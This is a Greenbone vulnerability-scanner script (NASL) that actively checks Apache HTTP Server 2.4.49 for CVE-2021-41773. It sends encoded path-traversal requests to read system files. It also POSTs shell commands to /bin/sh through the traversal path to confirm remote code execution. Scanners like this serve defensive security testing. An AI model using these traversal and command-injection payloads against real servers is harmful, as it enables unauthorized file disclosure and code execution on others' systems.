# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:http_server";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146844");
  script_version("2021-10-07T10:40:54+0000");
  script_tag(name:"last_modification", value:"2021-10-07 11:23:18 +0000 (Thu, 07 Oct 2021)");
  script_tag(name:"creation_date", value:"2021-10-06 08:16:20 +0000 (Wed, 06 Oct 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2021-41773");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache HTTP Server 2.4.49 Directory Traversal / RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_apache_http_server_consolidation.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl");
  script_mandatory_keys("apache/http_server/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Apache HTTP Server is prone to a directory traversal
  and a possible remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET/POST requests and checks the
  responses.");

  script_tag(name:"insight", value:"An attacker could use a path traversal attack to map URLs to
  files outside the expected document root.

  If files outside of the document root are not protected by 'require all denied' these requests
  can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts.

  Note: If 'mod_cgi' is enabled this flaw can be also be used by an attacker to achieve remote code
  execution (RCE).");

  script_tag(name:"affected", value:"Apache HTTP Server version 2.4.49.");

  script_tag(name:"solution", value:"Update to version 2.4.50 or later.");

  script_xref(name:"URL", value:"https://httpd.apache.org/security/vulnerabilities_24.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files();
cmds = exploit_commands();

foreach dir (make_list_unique("/", "/cgi-bin", "/icons", http_cgi_dirs(port: port))) {

  if (dir == "/")
    dir = "";

  foreach pattern (keys(files)) {
    url = dir + "/.%2e/" + crap(length: 7 * 6, data: "%2e%2e/") + files[pattern];

    req = http_get(port: port, item: url);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (egrep(pattern: pattern, string: res)) {
      report = 'It was possible to read "' + files[pattern] + '" through ' +
               http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n\n' + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }

  if (os_host_runs("Windows") != "yes") {
    url = dir + "/.%2e/" + crap(length: 7 * 6, data: "%2e%2e/") + "bin/sh";

    foreach pattern (keys(cmds)) {
      data = "A=|echo;" + cmds[pattern];

      req = http_post(port: port, item: url, data: data);
      res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

      if (egrep(pattern: pattern, string: res)) {
        info['HTTP Method'] = "POST";
        info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
        info['HTTP "POST" body'] = data;

        report  = 'By doing the following HTTP request:\n\n';
        report += text_format_table(array: info) + '\n\n';
        report += 'it was possible to execute the "' + cmds[pattern] + '" command on the target host.';
        report += '\n\nResult:\n\n' + res;
        expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
        security_message(port: port, data: report, expert_info: expert_info);
        exit(0);
      }
    }
  }
}

exit(0);
